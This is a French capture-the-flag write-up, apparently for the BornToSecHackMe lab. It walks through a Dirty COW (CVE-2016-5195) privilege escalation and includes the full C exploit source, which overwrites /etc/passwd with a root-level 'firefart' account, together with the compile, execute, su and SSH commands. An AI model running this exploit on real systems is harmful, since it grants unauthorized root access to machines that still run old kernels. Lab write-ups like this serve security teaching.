# Writeup 2 : Dirty COW (CVE-2016-5195)

La machine cible exécute une version du noyau Linux vulnérable à l'exploit "Dirty COW". Cette vulnérabilité permet à un utilisateur non privilégié d'obtenir un accès en écriture à des zones mémoire en lecture seule, ce qui peut être exploité pour modifier des fichiers appartenant à root, comme `/etc/passwd`.

## Vérification de la Vulnérabilité

Nous vérifions d'abord la version du noyau :
```bash
uname -a
# Résultat : Linux BornToSecHackMe 3.2.0-91-generic-pae ... 2015
```
Cette version (3.2.0) est antérieure aux versions corrigées (qui patchent la CVE-2016-5195 fin 2016), confirmant que le système est vulnérable.

## Détails de l'Exploit

Nous utilisons la variante "Firefart" de l'exploit Dirty COW (`dirty_user.c`). La logique est la suivante :
1. Mapper `/etc/passwd` en mémoire en lecture seule.
2. Lancer deux threads concurrents :
    - Thread 1 : Appelle continuellement `madvise(MADV_DONTNEED)` sur la map.
    - Thread 2 : Écrit continuellement dans `/proc/self/mem` à l'adresse de la map.
3. En raison d'une race condition dans la gestion du Copy-On-Write (COW), l'écriture réussit sur le fichier sous-jacent au lieu d'une copie privée.
4. Nous écrasons la ligne de l'utilisateur `root` par un nouvel utilisateur (`firefart`) ayant l'UID 0.

### Code de l'Exploit (dirty_user.c)

```c
// dirty_user.c - Basé sur la PoC Dirty COW de Firefart
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename;
const char *backup_filename;
void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
  char *str;
  str = (char *)arg;
  int i, c = 0;
  for (i = 0; i < 100000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

void *procselfmemThread(void *arg) {
  char *str;
  str = (char *)arg;
  int f = open("/proc/self/mem", O_RDWR);
  int i, c = 0;
  for (i = 0; i < 100000000; i++) {
    lseek(f, (uintptr_t) map, SEEK_SET);
    c += write(f, str, strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc, char *argv[])
{
  if (argc < 2) {
    (void)fprintf(stderr, "Usage: %s <password>\n", argv[0]);
    return 1;
  }
  pthread_t pth1, pth2;
  f = open("/etc/passwd", O_RDONLY);
  fstat(f, &st);
  name = "/etc/passwd";
  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
  printf("mmap %lx\n\n", (unsigned long)map);
  
  // Payload : Écraser root avec l'utilisateur firefart (UID 0)
  // Hash du mot de passe pour "password" avec le sel "fi" est "fi1IpG9ta02NJ"
  char *payload = "firefart:fi1IpG9ta02NJ:0:0:pwned:/root:/bin/bash";
  
  printf("Payload: %s\n", payload);
  
  pthread_create(&pth1, NULL, madviseThread, (void *)payload);
  pthread_create(&pth2, NULL, procselfmemThread, (void *)payload);
  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}
```

## Compilation et Exécution

Comme nous avons un accès web shell (ou SSH via `lmezard`), nous uploadons le code et le compilons sur la cible.

```bash
gcc -pthread dirty_user.c -o dirty_user -lcrypt
```

Nous l'exécutons avec un argument mot de passe (qui est techniquement codé en dur mais requis par la vérification d'utilisation) :

```bash
./dirty_user password
```

## Résultat

Après exécution, le fichier `/etc/passwd` est modifié. La première ligne change de `root:x...` à `firefart:fi...`.
Nous pouvons maintenant changer d'utilisateur pour `firefart` :

```bash
su firefart
# Mot de passe : password
```

Ou se connecter en SSH :

```bash
ssh firefart@192.168.64.3
```

Nous avons maintenant un accès **root** valide.
